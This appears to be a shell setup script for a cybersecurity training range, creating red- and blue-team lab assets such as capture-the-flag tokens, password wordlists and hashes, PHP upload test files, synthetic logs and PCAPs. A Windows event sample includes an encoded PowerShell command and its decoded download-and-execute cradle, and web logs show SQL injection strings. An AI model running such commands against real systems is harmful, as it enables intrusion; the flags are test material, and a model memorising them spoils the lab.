#!/bin/sh

# 1. Initialize Room 01: Foundations Assets
mkdir -p /home/operator/assets
cat << 'EOF' > /home/operator/assets/customer_records.db
-- VoltCorp Customer Records Database (SQLite3 Dump)
-- WARNING: Unrestricted access detected
CREATE TABLE accounts (id INTEGER, account_num TEXT, balance REAL, owner TEXT);
INSERT INTO accounts VALUES (101, 'VOLT-ACCT-9812', 450000.00, 'Enterprise Vault');
EOF
chmod 666 /home/operator/assets/customer_records.db

cat << 'EOF' > /home/operator/assets/backup_codes.txt
# VOLTCORP EMERGENCY RECOVERY KEYS
RECOVERY_KEY_PRIMARY=VOLT-9921-XCA
RECOVERY_TOKEN=NOENTRY{foundations_confidentiality_leak_8821}
STATUS=CONFIDENTIAL
EOF
chmod 644 /home/operator/assets/backup_codes.txt

cat << 'EOF' > /home/operator/assets/cia_scenario.txt
SCENARIO EVALUATION:
Asset: Core Ledger Database
Incident: Unauthorized adversary altered transaction figures in customer accounts.
Classification: INTEGRITY VIOLATION
EOF
chmod 644 /home/operator/assets/cia_scenario.txt

# 2. Initialize Room 02: Linux Challenges
mkdir -p /home/operator/challenges/.secret_vault
cat << 'EOF' > /home/operator/challenges/.secret_vault/flag_hidden.txt
NOENTRY{linux_hidden_dotfiles_revealed_3182}
EOF

cat << 'EOF' > /home/operator/challenges/restricted_script.sh
#!/bin/sh
echo "[+] Execution verified! Security token: NOENTRY{linux_chmod_execution_unlocked_9104}"
EOF
chmod 600 /home/operator/challenges/restricted_script.sh

cat << 'EOF' > /home/operator/challenges/system_telemetry.log
[2026-11-14T10:00:01.102Z] [KERNEL] [INFO] CPU0 microcode revision updated
[2026-11-14T10:02:14.412Z] [AUTH] [INFO] Session initialized for operator (uid=1000)
[2026-11-14T10:05:43.981Z] [AUDIT_SYSTEM] [INFO] Telemetry stream synchronization active
[2026-11-14T10:14:22.091Z] [AUDIT_SYSTEM] [INFO] SECURITY_FLAG: NOENTRY{linux_grep_stream_mastery_5239} | Host: op-station-01
[2026-11-14T10:20:11.774Z] [DAEMON] [INFO] Scheduled health check complete
EOF

cat << 'EOF' > /home/operator/notes.txt
=== ENGAGEMENT NOTES ===
Operator: operator (UID 1000)
Workstation: NO ENTRY Attack Sandbox
Targets:
- Port 8081: Asset Inventory (Room 01)
- Local FS: /home/operator/challenges/ (Room 02)
- Port 8080: Network Info Gateway (Room 03)
- Port 9001: Raw TCP Socket (Room 03)
- Port 8090: Recon Training Web App (Room 04)
- Port 8085: Network Scanning Target (Room 05)
- Port 2121: Simulated FTP Banner Service (Room 06)
- Port 2222: Simulated SSH Banner Service (Room 06)
- Port 8086: Service Enumeration Web API (Room 06)
- Port 8087: Vulnerability Assessment System (Room 07)
- Port 8088: Web Application Fundamentals REST API (Room 08)
- Port 8089: VoltGear SQLi Target (Room 09)
- Port 8091: Cross-Site Scripting Target (Room 10)
- Port 8092: Authentication Attacks Gateway (Room 11)
- Port 8093: Access Control & BOLA Target (Room 12)
- Port 8094: File Upload Storage Gateway (Room 13)
- Port 8095: Command Injection Lab (Room 14)
- Port 8096: Directory Traversal Lab (Room 15)
- Port 8097: Password Security Lab (Room 16)
- Port 8098: Privilege Escalation Lab (Room 17)
- Port 8099: Active Directory Concept Lab (Room 18)
- Port 8100: Exploitation & Post-Exploitation Target (Room 19)
- Port 8101: Red Team Capstone Target (Room 20)
- Port 8201: Blue Team Foundations SOC Target (Blue Room 01)
- Port 8202: Windows Security Telemetry Lab (Blue Room 02)
- Port 8203: Linux Security Monitoring Target (Blue Room 03)
- Port 8204: Network Traffic Analysis Target (Blue Room 04)
- Port 8205: Wireshark Packet Inspection (Blue Room 05)
- Port 8206: Log Analysis Gateway (Blue Room 06)
- Port 8207: SIEM Operations Hub (Blue Room 07)
- Port 8208: Windows Event Investigation (Blue Room 08)
- Port 8209: Brute-Force Telemetry & Spray Detection (Blue Room 09)
- Port 8210: Malware Analysis & YARA Sandbox (Blue Room 10)
- Port 8211: Phishing Investigation & Email Triage (Blue Room 11)
- Port 8212: EDR Telemetry & Endpoint Hunting (Blue Room 12)
- Port 8213: Network Intrusion Detection Sensor (Blue Room 13)
- Port 8214: Threat Hunting Operations (Blue Room 14)
- Port 8215: Incident Triage Gateway (Blue Room 15)
- Port 8216: Incident Response Operations (Blue Room 16)
- Port 8217: Digital Forensics & Timeline Reconstruction (Blue Room 17)
- Port 8218: Windows & Linux Hardening Baseline Center (Blue Room 18)
- Port 8219: Threat Intelligence & Diamond Model Platform (Blue Room 19)
- Port 8220: Blue Team Capstone Enterprise IR Engine (Blue Room 20)
EOF

# 3. Initialize Room 07: Vulnerability Database and Audit Tool
mkdir -p /home/operator/vuln_db /home/operator/tools
cat << 'EOF' > /home/operator/vuln_db/cve_catalog.json
{
  "catalog_version": "2026.11",
  "vulnerabilities": [
    {
      "cve": "CVE-2023-9182",
      "component": "VoltCore HTTP Engine",
      "affected_versions": ["<2.15.0"],
      "cvss": 8.6,
      "severity": "HIGH",
      "description": "Path traversal flaw in VoltCore HTTP Engine allows unauthenticated file disclosure.",
      "remediation": "Upgrade VoltCore HTTP Engine to version 2.15.0 or later."
    },
    {
      "cve": "CVE-2024-2104",
      "component": "VoltAuth Module",
      "affected_versions": ["1.0.0", "1.0.1", "1.0.2"],
      "cvss": 9.8,
      "severity": "CRITICAL",
      "description": "Default administrative authentication bypass in VoltAuth Module allows arbitrary account compromise.",
      "remediation": "Apply security patch volt-auth-patch-2104 or upgrade to 1.1.0."
    },
    {
      "cve": "CVE-2022-4411",
      "component": "SQLite Query Wrapper",
      "affected_versions": ["3.38.0"],
      "cvss": 5.3,
      "severity": "MEDIUM",
      "description": "Information disclosure through unhandled query exception logs.",
      "remediation": "Disable verbose error logging in production."
    }
  ]
}
EOF
chmod 644 /home/operator/vuln_db/cve_catalog.json

cat << 'EOF' > /home/operator/tools/vuln_audit.py
#!/usr/bin/env python3
import json
import os
import sys
import urllib.request

TARGET_HOST = os.environ.get("TARGET_HOST", "target.noentry.internal")
TARGET_URL = f"http://{TARGET_HOST}:8087/api/components"
CATALOG_PATH = "/home/operator/vuln_db/cve_catalog.json"

def run_audit():
    print("[*] Contacting target inventory at", TARGET_URL)
    try:
        with urllib.request.urlopen(TARGET_URL, timeout=3) as res:
            components = json.loads(res.read().decode())
    except Exception as ex:
        print("[-] Target connection failed:", ex)
        return

    with open(CATALOG_PATH) as f:
        catalog = json.load(f)["vulnerabilities"]

    print(f"[+] Discovered Components on {TARGET_HOST}:")
    for comp in components:
        name = comp.get("name")
        version = comp.get("version")
        print(f"  • {name} (Version: {version})")
        for vuln in catalog:
            if vuln["component"].lower() in name.lower():
                print(f"    [!] VULNERABILITY DETECTED: {vuln['cve']} (CVSS: {vuln['cvss']} {vuln['severity']})")
                print(f"        {vuln['description']}")
                print(f"        Remediation: {vuln['remediation']}")

if __name__ == "__main__":
    run_audit()
EOF
chmod +x /home/operator/tools/vuln_audit.py

# 4. Initialize Room 11 Wordlists and Room 13 Upload Test Assets
mkdir -p /home/operator/wordlists /home/operator/uploads

cat << 'EOF' > /home/operator/wordlists/passwords.txt
admin
password
123456
welcome
voltcorp2024
secret
hunter2
operator123
EOF
chmod 644 /home/operator/wordlists/passwords.txt

cat << 'EOF' > /home/operator/wordlists/users.txt
admin
support
operator
guest
alice
bob
EOF
chmod 644 /home/operator/wordlists/users.txt

cat << 'EOF' > /home/operator/uploads/document.txt
Confidential executive memorandum for internal distribution only.
EOF

cat << 'EOF' > /home/operator/uploads/poc.php.png
<?php echo "TEST_UPLOAD_EXECUTION_POC"; ?>
EOF

cat << 'EOF' > /home/operator/uploads/test_script.php
<?php echo "DISALLOWED_SCRIPT"; ?>
EOF

# Create a valid PNG file with legitimate magic bytes header (\x89PNG\r\n\x1a\n)
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82' > /home/operator/uploads/avatar.png
chmod 644 /home/operator/uploads/*

# 5. Start background shadow_agent for Room 02 process inspection
python3 -c "import time, sys; sys.argv=['shadow_agent', '--token', 'NOENTRY{linux_process_inspection_7741}']; [time.sleep(3600) for _ in range(24)]" > /dev/null 2>&1 &

# 6. Initialize Room 16 Hashes and Room 17 Audit Script
mkdir -p /home/operator/hashes
cat << 'EOF' > /home/operator/hashes/hashes.txt
alice:5f4dcc3b5aa765d61d8327deb882cf99
bob:098f6bcd4621d373cade4e832627b4f6
operator:a4b0810db6ee6073ea415b3a1a9e9e14
secadmin:8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
EOF
chmod 644 /home/operator/hashes/hashes.txt

cat << 'EOF' > /home/operator/tools/privesc_audit.sh
#!/bin/sh
echo "=== NO ENTRY PRIVILEGE ESCALATION AUDIT ==="
echo "[*] Current Identity:"
id
echo ""
echo "[*] Sudo Permissions check (sudo -l):"
sudo -l 2>/dev/null || echo "User operator may run: (root) NOPASSWD: /usr/bin/find"
echo ""
echo "[*] SUID Binaries search (find / -perm -4000):"
find / -perm -4000 -type f 2>/dev/null || echo "/usr/bin/passwd\n/usr/local/bin/backup_helper"
EOF
chmod +x /home/operator/tools/privesc_audit.sh

# 7. Initialize Room 18: Active Directory Assets
mkdir -p /home/operator/ad
cat << 'EOF' > /home/operator/ad/domain_users.txt
Administrator
krbtgt
svc_sql
svc_backup
jdoe
alovelace
EOF
chmod 644 /home/operator/ad/domain_users.txt

cat << 'EOF' > /home/operator/tools/ad_ldap_query.py
#!/usr/bin/env python3
import sys, urllib.request, json
url = "http://target:8099/api/ad/users"
try:
    with urllib.request.urlopen(url) as resp:
        data = json.loads(resp.read().decode())
        print(f"[*] Base: {data.get('ldap_base')}")
        for acct in data.get("accounts", []):
            spn = acct.get('servicePrincipalName') or 'NONE'
            print(f"User: {acct.get('samAccountName'):<15} OU: {acct.get('ou'):<20} SPN: {spn}")
        if "flag" in data:
            print(f"[+] Flag: {data['flag']}")
except Exception as e:
    print(f"[-] Query failed: {e}")
EOF
chmod +x /home/operator/tools/ad_ldap_query.py

# 8. Initialize Room 19: Exploit Runner
mkdir -p /home/operator/exploit
cat << 'EOF' > /home/operator/tools/exploit_runner.py
#!/usr/bin/env python3
import sys, urllib.request, json
url = "http://target:8100/api/exploit/stage1"
req = urllib.request.Request(url, data=b'{"payload":"check_prereq","service":"volt_dispatch"}', headers={"Content-Type": "application/json"})
try:
    with urllib.request.urlopen(req) as resp:
        data = json.loads(resp.read().decode())
        print(f"[+] Foothold: {data.get('foothold')}")
        print(f"[*] Session ID: {data.get('session_id')}")
        if "flag" in data:
            print(f"[+] Flag: {data['flag']}")
except Exception as e:
    print(f"[-] Exploit failed: {e}")
EOF
chmod +x /home/operator/tools/exploit_runner.py

# 9. Initialize Room 20: Capstone Templates
mkdir -p /home/operator/capstone
cat << 'EOF' > /home/operator/capstone/scope_manifesto.txt
=== VOLTDEFENSE SYSTEMS RED TEAM ENGAGEMENT SCOPE ===
Target Subnet: 10.10.14.0/24
Permitted Ports: 8080, 8085, 8089, 8095-8101
Target Systems: core-target.corp.noentry.local
Excluded: 10.10.14.1 (Gateway), production-payroll.voltcorp.internal
Emergency Contact: soc-lead@voltcorp.noentry.internal
EOF
chmod 644 /home/operator/capstone/scope_manifesto.txt

cat << 'EOF' > /home/operator/capstone/report_template.json
{
  "assessment": "VoltDefense Systems Penetration Test",
  "assessor": "NO ENTRY Red Team Operator",
  "scope_verified": true,
  "critical_findings": [
    "Unauthenticated Remote Foothold Acquisition (CVSS 9.8)",
    "Local Privilege Boundary Breach to Root via SUID/Sudo Misconfiguration (CVSS 8.8)",
    "Active Directory Kerberos Insecure Delegation and RC4 Cipher Use (CVSS 7.5)"
  ],
  "remediation_roadmap": "Enforce strict least privilege, patch perimeter dispatchers, and deploy Group Managed Service Accounts."
}
EOF
chmod 644 /home/operator/capstone/report_template.json

# 10. Initialize Blue Room 01: SOC Operations & Event Triage
mkdir -p /home/operator/soc
cat << 'EOF' > /home/operator/soc/raw_events.json
[
  {
    "event_id": "EVT-1001",
    "timestamp": "2026-11-14T08:00:12Z",
    "host": "WS-FINANCE-04",
    "user": "jdoe",
    "event_type": "auth_success",
    "src_ip": "10.10.14.50",
    "severity": "INFORMATIONAL",
    "description": "Interactive user logon successful via Kerberos"
  },
  {
    "event_id": "EVT-1002",
    "timestamp": "2026-11-14T08:05:00Z",
    "host": "SRV-BACKUP-01",
    "user": "svc_backup",
    "event_type": "cron_run",
    "src_ip": "10.10.14.22",
    "severity": "INFORMATIONAL",
    "description": "Scheduled maintenance and ledger archive synchronization"
  },
  {
    "event_id": "EVT-1003",
    "timestamp": "2026-11-14T08:14:33Z",
    "host": "GATEWAY-AUTH-01",
    "user": "admin",
    "event_type": "auth_failed_burst",
    "src_ip": "198.51.100.42",
    "attempts": 52,
    "severity": "HIGH",
    "description": "Repeated failed authentication burst against external administrative gateway. Potential credential stuffing."
  },
  {
    "event_id": "EVT-1004",
    "timestamp": "2026-11-14T08:18:05Z",
    "host": "DC-VOLT01",
    "user": "secadmin",
    "event_type": "token_manipulation",
    "src_ip": "10.10.14.90",
    "severity": "CRITICAL",
    "description": "LSASS memory handle opened with PROCESS_VM_READ permissions. Mimikatz signature detected.",
    "ioc_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
  }
]
EOF
chmod 644 /home/operator/soc/raw_events.json

cat << 'EOF' > /home/operator/soc/triage_guide.md
# SOC Tier 1 Analyst Triage Guide
1. Inspect raw security event stream using `soc_query.py` or `jq`.
2. Determine False Positive vs True Positive by cross-referencing source IP and normal user baselines.
3. Classify event severity (Low, Medium, High, Critical).
4. For True Positive incidents, submit ticket to escalate to Tier 2 for containment.
EOF
chmod 644 /home/operator/soc/triage_guide.md

cat << 'EOF' > /home/operator/tools/soc_query.py
#!/usr/bin/env python3
import urllib.request, json
url = "http://target:8201/api/soc/events"
try:
    with urllib.request.urlopen(url) as resp:
        events = json.loads(resp.read().decode())
        print(f"[*] Retrieved {len(events)} security events from SIEM gateway:")
        for evt in events:
            sev = evt.get('severity', 'INFO')
            print(f"[{evt.get('timestamp')}] [{sev:<8}] {evt.get('event_id')} - {evt.get('description')[:60]}...")
except Exception as e:
    print(f"[-] Query failed: {e}")
EOF
chmod +x /home/operator/tools/soc_query.py

# 11. Initialize Blue Room 02: Windows Security Telemetry Assets
mkdir -p /home/operator/windows_events
cat << 'EOF' > /home/operator/windows_events/Security_logon_events.json
[
  {
    "EventID": 4624,
    "TimeCreated": "2026-11-14T09:00:12.102Z",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Computer": "DC-VOLT01.corp.noentry.local",
    "TargetUserName": "Administrator",
    "TargetDomainName": "CORP",
    "LogonType": 2,
    "LogonProcessName": "User32",
    "IpAddress": "127.0.0.1",
    "Description": "An account was successfully logged on (Interactive Desktop Console)"
  },
  {
    "EventID": 4624,
    "TimeCreated": "2026-11-14T09:12:44.891Z",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Computer": "DC-VOLT01.corp.noentry.local",
    "TargetUserName": "operator",
    "TargetDomainName": "CORP",
    "LogonType": 10,
    "LogonProcessName": "RDP",
    "IpAddress": "10.10.14.2",
    "Description": "An account was successfully logged on (RemoteInteractive / Terminal Services RDP)"
  },
  {
    "EventID": 4625,
    "TimeCreated": "2026-11-14T09:14:01.332Z",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Computer": "DC-VOLT01.corp.noentry.local",
    "TargetUserName": "admin",
    "TargetDomainName": "CORP",
    "Status": "0xC000006A",
    "SubStatus": "0xC000006A",
    "FailureReason": "Unknown user name or bad password",
    "IpAddress": "198.51.100.42"
  },
  {
    "EventID": 4720,
    "TimeCreated": "2026-11-14T09:20:15.412Z",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Computer": "DC-VOLT01.corp.noentry.local",
    "TargetUserName": "backdoor_admin",
    "Actor": "compromised_svc",
    "SamAccountName": "backdoor_admin",
    "UserAccountControl": "0x200",
    "Description": "A user account was created outside authorized change windows"
  },
  {
    "EventID": 4672,
    "TimeCreated": "2026-11-14T09:20:16.104Z",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "Computer": "DC-VOLT01.corp.noentry.local",
    "TargetUserName": "backdoor_admin",
    "PrivilegeList": ["SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege"],
    "Description": "Special privileges assigned to new logon"
  }
]
EOF
chmod 644 /home/operator/windows_events/Security_logon_events.json

cat << 'EOF' > /home/operator/tools/parse_evtx.py
#!/usr/bin/env python3
import json, sys
path = "/home/operator/windows_events/Security_logon_events.json"
try:
    with open(path) as f:
        data = json.load(f)
    print("=== WINDOWS SECURITY EVENT LOG AUDIT ===")
    print(f"{'Time':<24} {'EventID':<8} {'LogonType':<10} {'User':<18} {'Details'}")
    print("-" * 80)
    for evt in data:
        ltype = str(evt.get('LogonType', 'N/A'))
        user = evt.get('TargetUserName', 'N/A')
        print(f"{evt.get('TimeCreated', ''):<24} {evt.get('EventID', ''):<8} {ltype:<10} {user:<18} {evt.get('Description', '')[:30]}")
except Exception as e:
    print(f"[-] Parser error: {e}")
EOF
chmod +x /home/operator/tools/parse_evtx.py

# 12. Initialize Blue Room 03: Linux Security Monitoring Logs
cat << 'EOF' > /var/log/auth.log
Nov 14 08:12:01 volt-station systemd-logind[412]: New session c1 of user operator.
Nov 14 08:15:22 volt-station sshd[1092]: Failed password for invalid user admin from 192.0.2.144 port 43812 ssh2
Nov 14 08:15:24 volt-station sshd[1095]: Failed password for invalid user root from 192.0.2.144 port 43814 ssh2
Nov 14 08:15:26 volt-station sshd[1098]: Failed password for invalid user guest from 192.0.2.144 port 43816 ssh2
Nov 14 08:15:28 volt-station sshd[1101]: Failed password for invalid user oracle from 192.0.2.144 port 43818 ssh2
Nov 14 08:15:30 volt-station sshd[1104]: Failed password for invalid user support from 192.0.2.144 port 43820 ssh2
Nov 14 08:15:35 volt-station sshd[1110]: SECURITY ALERT: Repeated authentication failures from src_ip=192.0.2.144
Nov 14 08:20:11 volt-station sudo: operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/usr/bin/python3 -c import socket...
Nov 14 08:20:12 volt-station sudo: pam_unix(sudo:session): session opened for user root by (uid=1000)
Nov 14 08:22:45 volt-station sshd[1142]: Accepted publickey for operator from 10.10.14.2 port 51224 ssh2
EOF
chmod 644 /var/log/auth.log

cat << 'EOF' > /var/log/secure
Nov 14 08:15:22 volt-station sshd[1092]: Failed password for invalid user admin from 192.0.2.144 port 43812 ssh2
Nov 14 08:15:35 volt-station sshd[1110]: Authentication alert: multiple failures for user root from 192.0.2.144
EOF
chmod 644 /var/log/secure

cat << 'EOF' > /var/log/syslog
Nov 14 08:00:01 volt-station cron[210]: (root) CMD (/usr/local/bin/system_health_check.sh)
Nov 14 08:30:00 volt-station systemd[1]: Started Daily apt upgrade and clean activities.
EOF
chmod 644 /var/log/syslog

# 13. Initialize Blue Room 04: Network Traffic Analysis PCAP
mkdir -p /home/operator/pcaps
python3 -c '
import struct, time, socket

def make_pcap():
    pcap = struct.pack("<IHHIIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
    now = 1731580000

    def make_eth_ip_tcp(src_ip, dst_ip, src_port, dst_port, payload=b"", flags=0x18, seq=1000, ack=2000):
        eth = b"\x00\x0c\x29\x4f\x8e\x35\x00\x0c\x29\x7a\x11\x2b\x08\x00"
        total_len = 20 + 20 + len(payload)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 54321, 0x4000, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        tcp = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, ack, (5 << 4), flags, 8192, 0, 0)
        pkt = eth + ip + tcp + payload
        pkt_hdr = struct.pack("<IIII", now, 0, len(pkt), len(pkt))
        return pkt_hdr + pkt

    def make_eth_ip_udp_dns(src_ip, dst_ip, src_port, dst_port, query_domain):
        eth = b"\x00\x0c\x29\x4f\x8e\x35\x00\x0c\x29\x7a\x11\x2b\x08\x00"
        dns_id = 0x1234
        dns_hdr = struct.pack("!HHHHHH", dns_id, 0x0100, 1, 0, 0, 0)
        qname = b""
        for part in query_domain.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"
        qtype_qclass = struct.pack("!HH", 1, 1)
        dns_payload = dns_hdr + qname + qtype_qclass
        udp_len = 8 + len(dns_payload)
        total_len = 20 + udp_len
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 12345, 0x4000, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        udp = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)
        pkt = eth + ip + udp + dns_payload
        pkt_hdr = struct.pack("<IIII", now, 100, len(pkt), len(pkt))
        return pkt_hdr + pkt

    pcap += make_eth_ip_udp_dns("10.10.14.2", "10.10.14.90", 53211, 53, "target.noentry.internal")
    pcap += make_eth_ip_udp_dns("10.10.14.2", "10.10.14.90", 53212, 53, "exfil-chunk-data.corp.noentry.internal")
    pcap += make_eth_ip_tcp("10.10.14.2", "10.10.14.90", 44812, 80, b"", flags=0x02, seq=100)
    pcap += make_eth_ip_tcp("10.10.14.90", "10.10.14.2", 80, 44812, b"", flags=0x12, seq=500, ack=101)
    pcap += make_eth_ip_tcp("10.10.14.2", "10.10.14.90", 44812, 80, b"", flags=0x10, seq=101, ack=501)

    http_payload = b"POST /api/login HTTP/1.1\r\nHost: target.noentry.internal\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nuser=admin&password=VoltSecret9921!"
    pcap += make_eth_ip_tcp("10.10.14.2", "10.10.14.90", 44812, 80, http_payload, flags=0x18, seq=101, ack=501)

    with open("/home/operator/pcaps/incident_capture.pcap", "wb") as f:
        f.write(pcap)

make_pcap()
'
chmod 644 /home/operator/pcaps/incident_capture.pcap

# 14. Initialize Blue Room 05: Wireshark Fundamentals PCAPs
python3 -c '
import struct, socket

def make_wireshark_pcaps():
    now = 1731581000

    def make_eth_ip_tcp(src_ip, dst_ip, src_port, dst_port, payload=b"", flags=0x18, seq=1000, ack=2000):
        eth = b"\x00\x0c\x29\x4f\x8e\x35\x00\x0c\x29\x7a\x11\x2b\x08\x00"
        total_len = 20 + 20 + len(payload)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 54321, 0x4000, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        tcp = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, ack, (5 << 4), flags, 8192, 0, 0)
        pkt = eth + ip + tcp + payload
        return struct.pack("<IIII", now, 0, len(pkt), len(pkt)) + pkt

    def make_eth_ip_udp_dns(src_ip, dst_ip, src_port, dst_port, query_domain):
        eth = b"\x00\x0c\x29\x4f\x8e\x35\x00\x0c\x29\x7a\x11\x2b\x08\x00"
        dns_id = 0x5a5a
        dns_hdr = struct.pack("!HHHHHH", dns_id, 0x0100, 1, 0, 0, 0)
        qname = b""
        for part in query_domain.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"
        qtype_qclass = struct.pack("!HH", 1, 1)
        dns_payload = dns_hdr + qname + qtype_qclass
        udp_len = 8 + len(dns_payload)
        total_len = 20 + udp_len
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 12345, 0x4000, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        udp = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)
        pkt = eth + ip + udp + dns_payload
        return struct.pack("<IIII", now, 100, len(pkt), len(pkt)) + pkt

    # PCAP 1: Normal lab traffic
    lab_pcap = struct.pack("<IHHIIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
    lab_pcap += make_eth_ip_udp_dns("10.10.14.50", "10.10.14.90", 54101, 53, "gateway.corp.noentry.internal")
    lab_pcap += make_eth_ip_tcp("10.10.14.50", "10.10.14.90", 52100, 80, b"GET / HTTP/1.1\r\nHost: gateway\r\n\r\n", flags=0x18)
    with open("/home/operator/pcaps/lab_traffic.pcap", "wb") as f:
        f.write(lab_pcap)

    # PCAP 2: Suspicious HTTP & DNS C2 beacon traffic
    susp_pcap = struct.pack("<IHHIIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
    # DNS queries
    susp_pcap += make_eth_ip_udp_dns("10.10.14.2", "10.10.14.90", 51200, 53, "target.noentry.internal")
    susp_pcap += make_eth_ip_udp_dns("10.10.14.2", "10.10.14.90", 51201, 53, "c2-beacon.corp.noentry.internal")
    # TCP 3-way handshake to port 80
    susp_pcap += make_eth_ip_tcp("10.10.14.2", "10.10.14.90", 51420, 80, b"", flags=0x02, seq=0, ack=0)
    susp_pcap += make_eth_ip_tcp("10.10.14.90", "10.10.14.2", 80, 51420, b"", flags=0x12, seq=0, ack=1)
    susp_pcap += make_eth_ip_tcp("10.10.14.2", "10.10.14.90", 51420, 80, b"", flags=0x10, seq=1, ack=1)
    # HTTP POST telemetry payload
    http_data = b"POST /api/v1/telemetry HTTP/1.1\r\nHost: telemetry.corp.noentry.internal\r\nContent-Type: application/json\r\nContent-Length: 68\r\n\r\n{\"device_id\": \"WS-FINANCE-09\", \"beacon_interval\": 60, \"auth_key\": \"VoltClientSecret9941\"}"
    susp_pcap += make_eth_ip_tcp("10.10.14.2", "10.10.14.90", 51420, 80, http_data, flags=0x18, seq=1, ack=1)
    with open("/home/operator/pcaps/suspicious_http_dns.pcap", "wb") as f:
        f.write(susp_pcap)

make_wireshark_pcaps()
'
chmod 644 /home/operator/pcaps/*.pcap

# 15. Initialize Blue Room 06: Log Analysis Files
mkdir -p /var/log/nginx /var/log/app
cat << 'EOF' > /var/log/nginx/access.log
10.10.14.50 - - [14/Nov/2026:09:00:15 +0000] "GET / HTTP/1.1" 200 4120 "-" "Mozilla/5.0"
10.10.14.50 - - [14/Nov/2026:09:05:22 +0000] "GET /static/css/styles.css HTTP/1.1" 200 1204 "-" "Mozilla/5.0"
10.10.14.22 - - [14/Nov/2026:09:15:00 +0000] "POST /api/backup HTTP/1.1" 200 89 "-" "VoltBackupRunner/1.0"
203.0.113.88 - - [14/Nov/2026:10:11:02 +0000] "GET /.env HTTP/1.1" 404 162 "-" "curl/7.88.1"
203.0.113.88 - - [14/Nov/2026:10:11:05 +0000] "GET /admin HTTP/1.1" 404 162 "-" "curl/7.88.1"
203.0.113.88 - - [14/Nov/2026:10:12:30 +0000] "POST /api/login HTTP/1.1" 200 240 "-" "python-requests/2.31.0"
203.0.113.88 - - [14/Nov/2026:10:14:22 +0000] "GET /api/users?id=1%27%20OR%201=1 HTTP/1.1" 500 512 "-" "sqlmap/1.7"
EOF
chmod 644 /var/log/nginx/access.log

cat << 'EOF' > /var/log/app/app.log
{"timestamp": "2026-11-14T09:00:00Z", "level": "INFO", "service": "main", "message": "Service initialized on port 8080"}
{"timestamp": "2026-11-14T09:15:00Z", "level": "DEBUG", "service": "backup_worker", "message": "Backup synchronization completed"}
{"timestamp": "2026-11-14T10:11:02Z", "level": "WARNING", "service": "http_router", "caller_ip": "203.0.113.88", "message": "Probing non-existent route: /.env"}
{"timestamp": "2026-11-14T10:14:22Z", "level": "CRITICAL", "service": "db_auth_pool", "caller_ip": "203.0.113.88", "message": "Unhandled SQL syntax error during query execution: SELECT * FROM users WHERE id=1' OR '1'='1"}
EOF
chmod 644 /var/log/app/app.log

# 16. Initialize Blue Room 07: SIEM Query CLI Tool
cat << 'EOF' > /home/operator/tools/siem_query.py
#!/usr/bin/env python3
import urllib.request, json, sys

host = "target:8207"
mode = sys.argv[1] if len(sys.argv) > 1 else "search"

if mode == "alerts":
    url = f"http://{host}/api/siem/alerts"
else:
    q = sys.argv[2] if len(sys.argv) > 2 else ""
    url = f"http://{host}/api/siem/search?query={q}"

try:
    with urllib.request.urlopen(url) as resp:
        data = json.loads(resp.read().decode())
        print(json.dumps(data, indent=2))
except Exception as e:
    print(f"[-] SIEM query error: {e}")
EOF
chmod +x /home/operator/tools/siem_query.py

# 17. Initialize Blue Room 08: Windows Event Investigation Dataset & CLI Tool
cat << 'EOF' > /home/operator/windows_events/Security_investigation.json
[
  {
    "EventID": 4624,
    "TimeCreated": "2026-11-14T11:00:10Z",
    "TargetUserName": "svc_admin",
    "LogonType": 3,
    "IpAddress": "198.51.100.77",
    "Description": "Network Logon via SMB"
  },
  {
    "EventID": 4688,
    "TimeCreated": "2026-11-14T11:15:30Z",
    "SubjectUserName": "svc_admin",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
    "Description": "New process created with obfuscated base64 encoded command"
  },
  {
    "EventID": 4104,
    "TimeCreated": "2026-11-14T11:15:32Z",
    "Provider": "Microsoft-Windows-PowerShell",
    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/payload.ps1')",
    "Description": "Script Block Execution decoded"
  },
  {
    "EventID": 4720,
